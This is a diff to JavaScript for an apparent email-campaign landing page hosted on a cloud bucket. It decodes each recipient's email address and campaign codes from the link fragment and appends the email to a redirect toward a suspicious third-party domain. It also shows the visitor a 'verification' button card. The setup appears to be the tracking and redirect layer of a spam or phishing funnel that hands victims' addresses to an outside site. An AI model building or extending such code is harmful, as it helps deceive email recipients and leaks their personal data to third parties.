@@ -16,6 +16,10 @@ const TAG_ABC_REDIRECT_URL = 'https://vvw676.rientsplay.com/?s1=upg10&email=zito
 // Tag we look for in the bucket host to trigger the special redirect
 const TARGET_TAG = 'abc';
 
+// For emailencode links the mailer ALWAYS appends camp_code + page_id = 4 hex chars
+// (page_id '00' when absent). Fixed length so the suffix can be stripped reliably.
+const EMAIL_SUFFIX_LEN = 4;
+
 // ========== GLOBAL STATE ==========
 let userCountry = '';
 let parsedTag = null;          // tag extracted from the bucket host (or null)
@@ -192,41 +196,64 @@ function buildTagRedirectUrl(baseUrl, hashValue) {
     }
 }
 
-// Extract camp code from fragment data
-function extractCampCode(fragmentData) {
+// Parse fragment data. Supports:
+//   md5sum:      32 hex = md5 | 34 hex = md5+camp | 36 hex = md5+camp+page
+//   emailencode: url_encode(email) + camp(2 hex) + page(2 hex), still percent-encoded
+function parseFragmentData(fragmentData) {
     if (!fragmentData || typeof fragmentData !== 'string') {
-        console.log('[CampCode] Ingen fragmentdata tillhandölls');
-        return null;
+        return { isValid: false, reason: 'no data' };
     }
 
-    if (fragmentData.length === 34) {
-        const hexRegex = /^[0-9a-fA-F]+$/;
-        if (hexRegex.test(fragmentData)) {
-            const md5Part = fragmentData.substring(0, 32);
+    const hexRegex = /^[0-9a-fA-F]+$/;
+
+    if (hexRegex.test(fragmentData)) {
+        if (fragmentData.length === 34 || fragmentData.length === 36) {
+            const hasPageId = fragmentData.length === 36;
             const campCodeHex = fragmentData.substring(32, 34);
-            const campCodeValue = parseInt(campCodeHex, 16);
-
-            console.log('[CampCode] Extraktion lyckades!');
-            console.log(`  - Fullständig data: ${fragmentData}`);
-            console.log(`  - MD5-del (32 tecken): ${md5Part}`);
-            console.log(`  - Camp-kod hex (2 tecken): ${campCodeHex}`);
-            console.log(`  - Camp-kod decimal (0-255): ${campCodeValue}`);
-
+            const pageIdHex = hasPageId ? fragmentData.substring(34, 36) : null;
             return {
-                fullData: fragmentData,
-                md5: md5Part,
+                format: 'md5sum', isValid: true, fullData: fragmentData,
+                md5: fragmentData.substring(0, 32),
                 campCodeHex: campCodeHex,
-                campCodeDecimal: campCodeValue,
-                isValid: true
+                campCodeDecimal: parseInt(campCodeHex, 16),
+                pageIdHex: pageIdHex,
+                pageIdDecimal: pageIdHex ? parseInt(pageIdHex, 16) : null
             };
-        } else {
-            console.log('[CampCode] Data är 34 tecken men inte giltig hex');
-            return { isValid: false, reason: 'Inte giltig hex' };
         }
-    } else {
-        console.log(`[CampCode] Datalängd är ${fragmentData.length}, förväntade 34 tecken för MD5+camp-format`);
-        return { isValid: false, reason: `Ogiltig längd: ${fragmentData.length}` };
+        if (fragmentData.length === 32) {
+            return { format: 'md5sum', isValid: true, fullData: fragmentData,
+                     md5: fragmentData, campCodeHex: null, campCodeDecimal: null,
+                     pageIdHex: null, pageIdDecimal: null };
+        }
+        return { isValid: false, reason: `bad hex length: ${fragmentData.length}` };
     }
+
+    // emailencode: strip fixed 4-char suffix, decode the email
+    if (fragmentData.length > EMAIL_SUFFIX_LEN) {
+        const suffix = fragmentData.slice(-EMAIL_SUFFIX_LEN);
+        if (hexRegex.test(suffix)) {
+            const encodedEmail = fragmentData.slice(0, -EMAIL_SUFFIX_LEN);
+            let email = encodedEmail;
+            try { email = decodeURIComponent(encodedEmail); } catch (e) { /* keep encoded */ }
+            return {
+                format: 'emailencode', isValid: true, fullData: fragmentData,
+                emailEncoded: encodedEmail, email: email,
+                campCodeHex: suffix.substring(0, 2),
+                campCodeDecimal: parseInt(suffix.substring(0, 2), 16),
+                pageIdHex: suffix.substring(2, 4),
+                pageIdDecimal: parseInt(suffix.substring(2, 4), 16)
+            };
+        }
+    }
+
+    return { isValid: false, reason: 'unrecognized format' };
+}
+
+// Extract the clean email for the default redirect URL.
+// Returns null when the hash holds no email (md5sum links).
+function getExtractedEmail() {
+    const parsed = parseFragmentData(getFragmentData());
+    return parsed.format === 'emailencode' ? parsed.email : null;
 }
 
 // Pick the redirect URL based on country
@@ -237,9 +264,24 @@ function extractCampCode(fragmentData) {
 // - Anything else      -> no_REDIRECT_URL (Norway is the fallback)
 function getRedirectUrl() {
     const country = (userCountry || '').toUpperCase();
-    if (country === 'US') return DEFAULT_REDIRECT_URL;
-	
-	return DEFAULT_REDIRECT_URL;
+
+    // Append the extracted email (emailencode links only; md5sum links have no
+    // email in the hash, so the param is simply omitted for them).
+    const withEmail = (baseUrl) => {
+        const email = getExtractedEmail();
+        if (!email) return baseUrl;
+        try {
+            const u = new URL(baseUrl);
+            u.searchParams.set('email', email);
+            return u.toString();
+        } catch (e) {
+            return baseUrl;
+        }
+    };
+
+    if (country === 'US') return withEmail(DEFAULT_REDIRECT_URL);
+
+	return withEmail(DEFAULT_REDIRECT_URL);
 	
     if (country === 'SE') return se_REDIRECT_URL;
     if (country === 'CH') return ch_REDIRECT_URL;
@@ -383,7 +425,7 @@ function createVerificationButton() {
     const fragmentData = getFragmentData();
     const t = getTranslations();
 
-    const campCodeData = extractCampCode(fragmentData);
+    const campCodeData = parseFragmentData(fragmentData);
     applyCampCodeStyling(campCodeData);
 
     const cardHtml = `
